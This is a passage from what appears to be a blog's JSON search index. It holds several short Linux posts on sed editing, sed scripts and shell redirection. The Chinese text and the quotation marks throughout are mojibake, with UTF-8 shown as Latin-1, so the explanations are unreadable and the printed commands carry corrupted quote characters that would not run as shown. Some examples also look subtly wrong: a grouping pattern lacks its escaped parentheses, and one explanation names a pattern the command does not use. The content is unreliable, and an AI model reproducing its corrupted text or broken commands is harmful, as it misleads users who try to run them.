example-----åœ¨æ•´è¡ŒèŒƒå›´å†…æŠŠtestæ›¿æ¢ä¸ºmytestã€‚å¦‚æœæ²¡æœ‰gæ ‡è®°ï¼Œåˆ™åªæœ‰æ¯è¡Œç¬¬ä¸€ä¸ªåŒ¹é…çš„testè¢«æ›¿æ¢æˆmytestã€‚#sed -n â€˜s/^test/mytest/pâ€™ example-----(-n)é€‰é¡¹å’Œpæ ‡å¿—ä¸€èµ·ä½¿ç”¨è¡¨ç¤ºåªæ‰“å°é‚£äº›å‘ç”Ÿæ›¿æ¢çš„è¡Œã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæŸä¸€è¡Œå¼€å¤´çš„testè¢«æ›¿æ¢æˆmytestï¼Œå°±æ‰“å°å®ƒã€‚#sed â€˜s/^192.168.0.1/&amp;localhost/â€™ example-----&amp;ç¬¦å·è¡¨ç¤ºæ›¿æ¢æ¢å­—ç¬¦ä¸²ä¸­è¢«æ‰¾åˆ°çš„éƒ¨ä»½ã€‚æ‰€æœ‰ä»¥192.168.0.1å¼€å¤´çš„è¡Œéƒ½ä¼šè¢«æ›¿æ¢æˆå®ƒè‡ªå·²åŠ localhostï¼Œå˜æˆ192.168.0.1localhostã€‚#sed -n â€˜s/(love)able/\\1rs/pâ€™ example-----loveè¢«æ ‡è®°ä¸º1ï¼Œæ‰€æœ‰loveableä¼šè¢«æ›¿æ¢æˆloversï¼Œè€Œä¸”æ›¿æ¢çš„è¡Œä¼šè¢«æ‰“å°å‡ºæ¥ã€‚#sed â€˜s#10#100#gâ€™ example-----ä¸è®ºä»€ä¹ˆå­—ç¬¦ï¼Œç´§è·Ÿç€så‘½ä»¤çš„éƒ½è¢«è®¤ä¸ºæ˜¯æ–°çš„åˆ†éš”ç¬¦ï¼Œæ‰€ä»¥ï¼Œâ€œ#â€åœ¨è¿™é‡Œæ˜¯åˆ†éš”ç¬¦ï¼Œä»£æ›¿äº†é»˜è®¤çš„â€œ/â€åˆ†éš”ç¬¦ã€‚è¡¨ç¤ºæŠŠæ‰€æœ‰10æ›¿æ¢æˆ100ã€‚é€‰å®šè¡Œçš„èŒƒå›´ï¼šé€—å·#sed -n â€˜/test/,/check/pâ€™ example-----æ‰€æœ‰åœ¨æ¨¡æ¿testå’Œcheckæ‰€ç¡®å®šçš„èŒƒå›´å†…çš„è¡Œéƒ½è¢«æ‰“å°ã€‚#sed -n â€˜5,/^test/pâ€™ example-----æ‰“å°ä»ç¬¬äº”è¡Œå¼€å§‹åˆ°ç¬¬ä¸€ä¸ªåŒ…å«ä»¥testå¼€å§‹çš„è¡Œä¹‹é—´çš„æ‰€æœ‰è¡Œã€‚#sed â€˜/test/,/check/s/$/sed test/â€™ example-----å¯¹äºæ¨¡æ¿testå’Œwestä¹‹é—´çš„è¡Œï¼Œæ¯è¡Œçš„æœ«å°¾ç”¨å­—ç¬¦ä¸²sed testæ›¿æ¢ã€‚å¤šç‚¹ç¼–è¾‘ï¼šeå‘½ä»¤ sed -e â€˜1,5dâ€™ -e â€˜s/test/check/â€™ example-----(-e)é€‰é¡¹å…è®¸åœ¨åŒä¸€è¡Œé‡Œæ‰§è¡Œå¤šæ¡å‘½ä»¤ã€‚å¦‚ä¾‹å­æ‰€ç¤ºï¼Œç¬¬ä¸€æ¡å‘½ä»¤åˆ é™¤1è‡³5è¡Œï¼Œç¬¬äºŒæ¡å‘½ä»¤ç”¨checkæ›¿æ¢testã€‚å‘½ä»¤çš„æ‰§è¡Œé¡ºåºå¯¹ç»“æœæœ‰å½±å“ã€‚å¦‚æœä¸¤ä¸ªå‘½ä»¤éƒ½æ˜¯æ›¿æ¢å‘½ä»¤ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªæ›¿æ¢å‘½ä»¤å°†å½±å“ç¬¬äºŒä¸ªæ›¿æ¢å‘½ä»¤çš„ç»“æœã€‚#sed -e â€˜/and/s/aaa/bbb/â€™ filename-----sedä¸­ç”¨bbbæ›¿æ¢åŒä¸€è¡Œä¸­åŒ…æ‹¬å­—ç¬¦ä¸²andçš„å­—ç¬¦ä¸²aaaï¼Œè€Œä¸æ˜¯æ¯ä¸€è¡Œä¸­çš„å­—ç¬¦ä¸²aaa#sed --expression=â€˜s/test/check/â€™ --expression=â€™/love/dâ€™ example-----ä¸€ä¸ªæ¯”-eæ›´å¥½çš„å‘½ä»¤æ˜¯â€“expressionã€‚å®ƒèƒ½ç»™sedè¡¨è¾¾å¼èµ‹å€¼ã€‚ä»æ–‡ä»¶è¯»å…¥ï¼šrå‘½ä»¤#sed â€˜/test/r fileâ€™ example-----fileé‡Œçš„å†…å®¹è¢«è¯»è¿›æ¥ï¼Œæ˜¾ç¤ºåœ¨ä¸teståŒ¹é…çš„è¡Œåé¢ï¼Œå¦‚æœåŒ¹é…å¤šè¡Œï¼Œåˆ™fileçš„å†…å®¹å°†æ˜¾ç¤ºåœ¨æ‰€æœ‰åŒ¹é…è¡Œçš„ä¸‹é¢ã€‚å†™å…¥æ–‡ä»¶ï¼šwå‘½ä»¤#sed -n â€˜/test/w fileâ€™ example-----åœ¨exampleä¸­æ‰€æœ‰åŒ…å«testçš„è¡Œéƒ½è¢«å†™å…¥fileé‡Œã€‚è¿½åŠ å‘½ä»¤ï¼šaå‘½ä»¤#sed â€˜/^test/a\\â€”&gt;this is a exampleâ€™ example&lt;-----'this is a exampleâ€™è¢«è¿½åŠ åˆ°ä»¥testå¼€å¤´çš„è¡Œåé¢ï¼Œsedè¦æ±‚å‘½ä»¤aåé¢æœ‰ä¸€ä¸ªåæ–œæ ã€‚æ’å…¥ï¼šiå‘½ä»¤#sed '/test/i\\new lineâ€¦â€¦â€¦â€¦â€¦â€¦â€™ example-----å¦‚æœtestè¢«åŒ¹é…ï¼Œåˆ™æŠŠåæ–œæ åé¢çš„æ–‡æœ¬æ’å…¥åˆ°åŒ¹é…è¡Œçš„å‰é¢ã€‚ä¸‹ä¸€ä¸ªï¼šnå‘½ä»¤ sed â€˜/test/{ n; s/aa/bb/; }â€™ example-----å¦‚æœtestè¢«åŒ¹é…ï¼Œåˆ™ç§»åŠ¨åˆ°åŒ¹é…è¡Œçš„ä¸‹ä¸€è¡Œï¼Œæ›¿æ¢è¿™ä¸€è¡Œçš„aaï¼Œå˜ä¸ºbbï¼Œå¹¶æ‰“å°è¯¥è¡Œï¼Œç„¶åç»§ç»­ã€‚å˜å½¢ï¼šyå‘½ä»¤#sed â€˜1,10y/abcde/ABCDE/â€™ example-----æŠŠ1â€“10è¡Œå†…æ‰€æœ‰abcdeè½¬å˜ä¸ºå¤§å†™ï¼Œæ³¨æ„ï¼Œæ­£åˆ™è¡¨è¾¾å¼å…ƒå­—ç¬¦ä¸èƒ½ä½¿ç”¨è¿™ä¸ªå‘½ä»¤ã€‚é€€å‡ºï¼šqå‘½ä»¤#sed â€˜10qâ€™ example-----æ‰“å°å®Œç¬¬10è¡Œåï¼Œé€€å‡ºsedã€‚ä¿æŒå’Œè·å–ï¼šhå‘½ä»¤å’ŒGå‘½ä»¤#sed -e â€˜/test/hâ€™ -e '$G example-----åœ¨sedå¤„ç†æ–‡ä»¶çš„æ—¶å€™ï¼Œæ¯ä¸€è¡Œéƒ½è¢«ä¿å­˜åœ¨ä¸€ä¸ªå«æ¨¡å¼ç©ºé—´çš„ä¸´æ—¶ç¼“å†²åŒºä¸­ï¼Œé™¤éè¡Œè¢«åˆ é™¤æˆ–è€…è¾“å‡ºè¢«å–æ¶ˆï¼Œå¦åˆ™æ‰€æœ‰è¢«å¤„ç†çš„è¡Œéƒ½å°†æ‰“å°åœ¨å±å¹•ä¸Šã€‚æ¥ç€æ¨¡å¼ç©ºé—´è¢«æ¸…ç©ºï¼Œå¹¶å­˜å…¥æ–°çš„ä¸€è¡Œç­‰å¾…å¤„ç†ã€‚åœ¨è¿™ä¸ªä¾‹å­é‡Œï¼ŒåŒ¹é…testçš„è¡Œè¢«æ‰¾åˆ°åï¼Œå°†å­˜å…¥æ¨¡å¼ç©ºé—´ï¼Œhå‘½ä»¤å°†å…¶å¤åˆ¶å¹¶å­˜å…¥ä¸€ä¸ªç§°ä¸ºä¿æŒç¼“å­˜åŒºçš„ç‰¹æ®Šç¼“å†²åŒºå†…ã€‚ç¬¬äºŒæ¡è¯­å¥çš„æ„æ€æ˜¯ï¼Œå½“åˆ°è¾¾æœ€åä¸€è¡Œåï¼ŒGå‘½ä»¤å–å‡ºä¿æŒç¼“å†²åŒºçš„è¡Œï¼Œç„¶åæŠŠå®ƒæ”¾å›æ¨¡å¼ç©ºé—´ä¸­ï¼Œä¸”è¿½åŠ åˆ°ç°åœ¨å·²ç»å­˜åœ¨äºæ¨¡å¼ç©ºé—´ä¸­çš„è¡Œçš„æœ«å°¾ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­å°±æ˜¯è¿½åŠ åˆ°æœ€åä¸€è¡Œã€‚ç®€å•æ¥è¯´ï¼Œä»»ä½•åŒ…å«testçš„è¡Œéƒ½è¢«å¤åˆ¶å¹¶è¿½åŠ åˆ°è¯¥æ–‡ä»¶çš„æœ«å°¾ã€‚ä¿æŒå’Œäº’æ¢ï¼šhå‘½ä»¤å’Œxå‘½ä»¤#sed -e â€˜/test/hâ€™ -e â€˜/check/xâ€™ example -----äº’æ¢æ¨¡å¼ç©ºé—´å’Œä¿æŒç¼“å†²åŒºçš„å†…å®¹ã€‚ä¹Ÿå°±æ˜¯æŠŠåŒ…å«testä¸checkçš„è¡Œäº’æ¢ã€‚ç»¼åˆå®ä¾‹ï¼šå°†ä¸‹æ–‡ä¸­ä»¥blog.fity.cnå¼€å¤´çš„å­—æ®µåé¢4ä½æ”¹æˆ9999ï¼Œæœ€ç»ˆå˜ä¸ºblog.fity.cn9999#cat filenameblog.fity.cnxxxxblog.fity.cnABCSfity.cn2012blog.fity.cn2013hello,2013!#sed -i â€œs/blog.fity.cn/blog.fity.cn9999/gâ€ filenameæ›¿æ¢#cat /test.txtweb accesslogaccesslogaccesslogccesslogaccesslogssaccesslogest.conf cs#sed -i â€˜s/accesslog.log/accesslog/gâ€™ test.txt#cat /test.txtweb accesslogest.conf cs#sed -i 's/accesslog./accesslog/gâ€™ test.txt#cat /test.txtweb accesslog6ã€è„šæœ¬Sedè„šæœ¬æ˜¯ä¸€ä¸ªsedçš„å‘½ä»¤æ¸…å•ï¼Œå¯åŠ¨Sedæ—¶ä»¥-fé€‰é¡¹å¼•å¯¼è„šæœ¬æ–‡ä»¶åã€‚Sedå¯¹äºè„šæœ¬ä¸­è¾“å…¥çš„å‘½ä»¤éå¸¸æŒ‘å‰”ï¼Œåœ¨å‘½ä»¤çš„æœ«å°¾ä¸èƒ½æœ‰ä»»ä½•ç©ºç™½æˆ–æ–‡æœ¬ï¼Œå¦‚æœåœ¨ä¸€è¡Œä¸­æœ‰å¤šä¸ªå‘½ä»¤ï¼Œè¦ç”¨åˆ†å·åˆ†éš”ã€‚ä»¥#å¼€å¤´çš„è¡Œä¸ºæ³¨é‡Šè¡Œï¼Œä¸”ä¸èƒ½è·¨è¡Œã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"linux sedæ‰¹é‡æ›¿æ¢å¤šä¸ªæ–‡ä»¶ä¸­çš„å­—ç¬¦ä¸²","slug":"history/tech/5953c4d0c2b92f5665eed9ce","date":"2015-12-29T19:39:26.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9ce/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9ce/","excerpt":"","text":"sed -i â€œs/oldstring/newstring/gâ€ grep oldstring -rl yourdirä¾‹å¦‚ï¼šæ›¿æ¢/homeä¸‹æ‰€æœ‰æ–‡ä»¶ä¸­çš„ä¸ºadmin99.netsed -i â€œs/www.admin99.net/admin99.net/gâ€ grep -rl /home","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"sedå¤„ç†å˜é‡æ›¿æ¢","slug":"history/tech/5953c4d0c2b92f5665eed9cd","date":"2015-12-29T19:38:10.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9cd/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9cd/","excerpt":"","text":"a=â€œtest1â€ b=â€œ2testâ€ echo $a | sed &quot;s 1 $b &quot;test2testå³â€“&gt; æ ¼å¼ä¸ºsed &quot;s $å˜é‡1 å˜é‡2 \"ï¼Œæ³¨æ„ä¸€å®šæ˜¯åŒå¼•å·ï¼Œè¿™é‡Œä»¥ç©ºæ ¼ä¸ºåˆ†éš”ç¬¦ï¼Œæ­£å¸¸å¯ä»¥ä½¿ç”¨sed \"s/å˜é‡1/$å˜é‡2/ &quot;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"sed ä¸­ä½¿ç”¨å˜é‡","slug":"history/tech/5953c4d0c2b92f5665eed9cc","date":"2015-12-29T19:37:29.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9cc/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9cc/","excerpt":"","text":"ä¸€èˆ¬åœ¨sed ä¸­æ›¿æ¢éƒ½ç”¨å•å¼•å·ï¼Œå¦‚ä¸‹è¾¹sed -in-place â€˜s/8080/8001/gâ€™ /home/work/server.xmlä½†æ˜¯å¦‚æœéœ€è¦æŠŠ8001æ”¹æˆå˜é‡ï¼Œå¦‚sed -in-place â€™s/8080/port/gâ€˜ /home/work/server.xml è¿™æ ·å°±ä¸æˆåŠŸã€‚ æ­¤æ—¶éœ€è¦æŠŠå•å¼•å·æ”¹æˆåŒå¼•å·,å¦‚ä¸‹è¾¹ä¾‹å­ port=8001sed -in-place â€œs/8080/$port/gâ€ /home/work/server.xml","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"æŒ‰ç…§æ—¥æœŸé‡å®šå‘","slug":"history/tech/5953c4d0c2b92f5665eed9cb","date":"2015-12-29T18:29:38.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9cb/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9cb/","excerpt":"","text":"top | while read line; do now=date &quot;+%Y-%m-%d-%H:%M:%S&quot;; echo $line &gt;&gt; $now.log; done;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"Linuxä¸­å„ç§æ“ä½œç¬¦ é‡å®šå‘æ“ä½œç¬¦ã€ç®¡é“ç¬¦","slug":"history/tech/5953c4d0c2b92f5665eed9ca","date":"2015-12-29T17:49:19.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9ca/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9ca/","excerpt":"","text":"Linuxä¸­å„ç§æ“ä½œç¬¦ é‡å®šå‘æ“ä½œç¬¦ã€ç®¡é“ç¬¦ (2012-09-15 23:19:28)è½¬è½½â–¼æ ‡ç­¾ï¼š æ‚è°ˆ åˆ†ç±»ï¼š LinuxLinuxé‡å®šå‘æ“ä½œç¬¦ åŠŸèƒ½æè¿°&gt; å°†å‘½ä»¤è¾“å‡ºå†™å…¥æ–‡ä»¶æˆ–è®¾å¤‡ï¼Œè€Œä¸æ˜¯å‘½ä»¤æç¤ºç¬¦æˆ–å¥æŸ„ï¼Œæ¸…ç©ºåŸæœ‰æ–‡ä»¶ç„¶åå†™å…¥&lt; ä»æ–‡ä»¶è€Œä¸æ˜¯ä»é”®ç›˜æˆ–å¥æŸ„è¯»å…¥å‘½ä»¤è¾“å…¥&gt;&gt; å°†å‘½ä»¤è¾“å‡ºæ·»åŠ åˆ°æ–‡ä»¶æœ«å°¾è€Œä¸åˆ é™¤æ–‡ä»¶ä¸­å·²æœ‰çš„ä¿¡æ¯ ä¸&gt;æ¯”è¾ƒä½¿ç”¨&gt;&amp; å°†ä¸€ä¸ªå¥æŸ„çš„è¾“å‡ºå†™å…¥åˆ°å¦ä¸€ä¸ªå¥æŸ„çš„è¾“å…¥ä¸­&lt;&amp; ä»ä¸€ä¸ªå¥æŸ„è¯»å–è¾“å…¥å¹¶å°†å…¶å†™å…¥åˆ°å¦ä¸€ä¸ªå¥æŸ„è¾“å‡ºä¸­| ä»ä¸€ä¸ªå‘½ä»¤ä¸­è¯»å–è¾“å‡ºå¹¶å°†å…¶å†™å…¥å¦ä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥ä¸­ï¼›ä¹Ÿç§°ä¸ºç®¡é“æ“ä½œç¬¦mysh &gt; mylog.txt 2&gt;&amp;1å°±å¯æ˜ç™½ï¼š&gt; mylog.txtæ„æ€æ˜¯å°†æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°mylog.txtï¼Œç­‰ä»·äºmysh 1&gt; mylog.txtï¼›2 &gt;&amp; 1 æ„æ€æ˜¯å°†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°å¥æŸ„1æ ‡å‡†è¾“å‡ºï¼›ç»¼åˆèµ·æ¥å°±æ˜¯myshå‘½ä»¤æ‰§è¡Œè¿‡ç¨‹ä¸­äº§ç”Ÿçš„æ ‡å‡†è¾“å‡ºå’Œé”™è¯¯è¾“å‡ºéƒ½ä¼šè¢«é‡å®šå‘åˆ°mylog.txtä¸­ï¼›","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"shell æç¤º ambiguous redirect","slug":"history/tech/5953c4d0c2b92f5665eed9c9","date":"2015-12-29T17:48:50.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9c9/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9c9/","excerpt":"","text":"head -50000 dir/dir/dir/file &gt;access_$creatimedate +%m%d-%k%Mï¼Œç”±äºä½¿ç”¨äº†dateçš„ %k æ ¼å¼ï¼Œè€Œä¸”æ²¡æœ‰ä½¿ç”¨åŒå¼•å·ï¼Œå‡Œæ™¨å¼€å§‹ï¼Œåœ¨é‡å®šå‘åˆ°ä»¥æ—¥æœŸä¸ºæ–‡ä»¶åçš„æ–‡ä»¶æ—¶ï¼Œå‡ºç°äº†é”™è¯¯â€œambiguous redirectâ€å› ä¸º%Kçš„æ ¼å¼ç”Ÿæˆçš„æ—¥å¿—æ ¼å¼åç±»ä¼¼äº access_0526- 146æ”¹æˆä½¿ç”¨%Hå‚æ•°ï¼Œæˆ–è€…å°†æ–‡ä»¶åç”¨åŒå¼•å·æ‹¬èµ·æ¥å³å¯ã€‚è¯´æ˜ï¼šThe redirect error normally occurs when a wildcard is used or spaces exist in the filename and it hasnâ€™t been surrounded by quotes.è½¬è½½è‡ªé›¶åº¦ç§‘æŠ€ï¼šhttp://www.ldisp.com/a/primary/2014/2642.shtml","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"linux-shellä¸­è¾“å…¥è¾“å‡ºé‡å®šå‘çš„ç”¨æ³•ï¼ˆè½¬ï¼‰","slug":"history/tech/5953c4d0c2b92f5665eed9c8","date":"2015-12-29T17:34:04.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed9c8/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed9c8/","excerpt":"","text":"http://blog.sina.com.cn/s/blog_54eb9d9e0102vqxb.htmlmycommand &gt;mylog.txt 2&gt;&amp;1 åº”è¯¥æ˜¯æœ€ç»å…¸çš„ç”¨æ³•äº†ã€‚å‘½ä»¤çš„ç»“æœå¯ä»¥é€šè¿‡â€œ%&gt;â€çš„å½¢å¼æ¥å®šå‘è¾“å‡ºï¼Œ%è¡¨ç¤ºæ–‡ä»¶æè¿°ç¬¦ï¼š1ä¸ºæ ‡å‡†è¾“å‡ºstdoutã€2ä¸ºæ ‡å‡†é”™è¯¯stderrã€‚ç³»ç»Ÿé»˜è®¤%å€¼æ˜¯1ï¼Œä¹Ÿå°±æ˜¯â€œ1&gt;â€ï¼Œè€Œ1&gt;å¯ä»¥ç®€å†™ä¸º&gt;ï¼Œä¹Ÿå°±æ˜¯é»˜è®¤ä¸º&gt;ã€‚stdoutçš„é»˜è®¤ç›®æ ‡æ˜¯ç»ˆç«¯ï¼Œstderrçš„é»˜è®¤ç›®æ ‡ä¸ºä¹Ÿæ˜¯ç»ˆç«¯ã€‚æˆ‘ä»¬åœ¨æ‰¹å¤„ç†ä¸­æ‰§è¡Œï¼š echo text &gt;result.txt ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨å±å¹•ä¸Šä¼šçœ‹åˆ° echo text 1&gt;result.txt ï¼Œå³æ˜¯è¿™ä¸ªé“ç†ã€‚å…¶ä¸­&amp;éœ€è¦ç›´æ¥ä¸é‡å®šå‘ç¬¦å·ç»“åˆä½¿ç”¨ã€‚å‚è€ƒï¼š1ã€http://www.google.cn/search?q=â€œ2&gt;&amp;1â€2ã€http://www.microsoft.com/technet/prodtechnol/windowsserver2003/zh-chs/library/ServerHelp/04969a04-a424-4776-bdc7-dc5066ce79b2.mspx?mfr=trueåº”ç”¨å®ä¾‹ï¼š1ã€å°†ç»“æœè¾“å‡ºåˆ°result.txtnet stop myservices &gt;&gt;result 2&gt;&amp;12ã€éšè—ç¨‹åºè¾“å‡ºç»“æœnet stop myservices &gt;nul 2&gt;nulå¾®è½¯å…³äºé‡å®šå‘çš„æ–‡ç« ï¼šä½¿ç”¨å‘½ä»¤é‡å®šå‘æ“ä½œç¬¦æ›´æ–°æ—¥æœŸï¼š 01/21/2005ä½¿ç”¨å‘½ä»¤é‡å®šå‘æ“ä½œç¬¦å¯ä»¥ä½¿ç”¨é‡å®šå‘æ“ä½œç¬¦å°†å‘½ä»¤è¾“å…¥å’Œè¾“å‡ºæ•°æ®æµä»é»˜è®¤ä½ç½®é‡å®šå‘åˆ°å…¶ä»–ä½ç½®ã€‚è¾“å…¥æˆ–è¾“å‡ºæ•°æ®æµçš„ä½ç½®ç§°ä¸ºå¥æŸ„ã€‚ä¸‹è¡¨å°†åˆ—å‡ºå¯ç”¨çš„å¥æŸ„ã€‚å¥æŸ„ å¥æŸ„çš„æ•°å­—ä»£å· æè¿°STDIN0é”®ç›˜è¾“å…¥STDOUT1è¾“å‡ºåˆ°å‘½ä»¤æç¤ºç¬¦çª—å£STDERR2é”™è¯¯è¾“å‡ºåˆ°å‘½ä»¤æç¤ºç¬¦çª—å£UNDEFINED3-9å¥æŸ„ç”±åº”ç”¨ç¨‹åºå•ç‹¬å®šä¹‰ï¼Œå®ƒä»¬æ˜¯å„ä¸ªå·¥å…·ç‰¹æœ‰çš„æ•°å­— 0 åˆ° 9 ä»£è¡¨å‰ 10 ä¸ªå¥æŸ„ã€‚å¯ä»¥ä½¿ç”¨å‘½ä»¤ Cmd.exe è¿è¡Œç¨‹åºï¼Œå¹¶å¯¹è¯¥ç¨‹åºå‰ 10 ä¸ªå¥æŸ„ä¸­çš„ä»»ä½•ä¸€ä¸ªå¥æŸ„è¿›è¡Œé‡å®šå‘ã€‚è¦æŒ‡å®šè¦ç”¨çš„å¥æŸ„ï¼Œè¯·åœ¨é‡å®šå‘æ“ä½œç¬¦ä¹‹å‰é”®å…¥è¯¥å¥æŸ„çš„æ•°å­—ã€‚å¦‚æœæœªå®šä¹‰å¥æŸ„ï¼Œåˆ™é»˜è®¤çš„ &lt; é‡å®šå‘è¾“å…¥æ“ä½œç¬¦æ˜¯ 0ï¼Œè€Œé»˜è®¤çš„ &gt; é‡å®šå‘è¾“å‡ºæ“ä½œç¬¦æ˜¯ 1ã€‚é”®å…¥ &lt; æˆ– &gt; æ“ä½œç¬¦ä¹‹åï¼Œå¿…é¡»æŒ‡å®šæ•°æ®çš„è¯»å†™ä½ç½®ã€‚å¯ä»¥æŒ‡å®šæ–‡ä»¶åæˆ–å…¶ä»–ç°æœ‰çš„å¥æŸ„ã€‚è¦æŒ‡å®šé‡å®šå‘åˆ°ç°æœ‰å¥æŸ„ï¼Œè¯·ä½¿ç”¨ä¸ (&amp;) å­—ç¬¦ï¼Œåé¢æ¥è¦é‡å®šå‘çš„å¥æŸ„å·ï¼ˆå³ &amp;å¥æŸ„å·ï¼‰ã€‚ä¾‹å¦‚ï¼Œä¸‹é¢çš„å‘½ä»¤å¯ä»¥å°†å¥æŸ„ 2ï¼ˆå³ STDERRï¼‰é‡å®šå‘åˆ°å¥æŸ„ 1ï¼ˆå³ STDOUTï¼‰ï¼š2&gt;&amp;1ä¸‹è¡¨åˆ—å‡ºäº†å¯ç”¨äºé‡å®šå‘è¾“å…¥å’Œè¾“å‡ºæ•°æ®æµçš„æ“ä½œç¬¦ã€‚é‡å®šå‘æ“ä½œç¬¦ æè¿°å°†å‘½ä»¤è¾“å‡ºå†™å…¥åˆ°æ–‡ä»¶æˆ–è®¾å¤‡ï¼ˆå¦‚æ‰“å°æœºï¼‰ï¼Œè€Œä¸æ˜¯å‘½ä»¤æç¤ºç¬¦çª—å£æˆ–å¥æŸ„ã€‚&lt;ä»æ–‡ä»¶è€Œä¸æ˜¯ä»é”®ç›˜æˆ–å¥æŸ„è¯»å…¥å‘½ä»¤è¾“å…¥ã€‚å°†å‘½ä»¤è¾“å‡ºæ·»åŠ åˆ°æ–‡ä»¶æœ«å°¾è€Œä¸åˆ é™¤æ–‡ä»¶ä¸­å·²æœ‰çš„ä¿¡æ¯ã€‚&amp;å°†ä¸€ä¸ªå¥æŸ„çš„è¾“å‡ºå†™å…¥åˆ°å¦ä¸€ä¸ªå¥æŸ„çš„è¾“å…¥ä¸­ã€‚&lt;&amp;ä»ä¸€ä¸ªå¥æŸ„è¯»å–è¾“å…¥å¹¶å°†å…¶å†™å…¥åˆ°å¦ä¸€ä¸ªå¥æŸ„è¾“å‡ºä¸­ã€‚|ä»ä¸€ä¸ªå‘½ä»¤ä¸­è¯»å–è¾“å‡ºå¹¶å°†å…¶å†™å…¥å¦ä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥ä¸­ã€‚ä¹Ÿç§°ä½œç®¡é“ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå¯ä»¥ä»é”®ç›˜å°†å‘½ä»¤è¾“å…¥ï¼ˆå³ STDIN å¥æŸ„ï¼‰å‘é€åˆ° Cmd.exeï¼Œç„¶åç”± Cmd.exe å°†å‘½ä»¤è¾“å‡ºï¼ˆå³ STDOUT 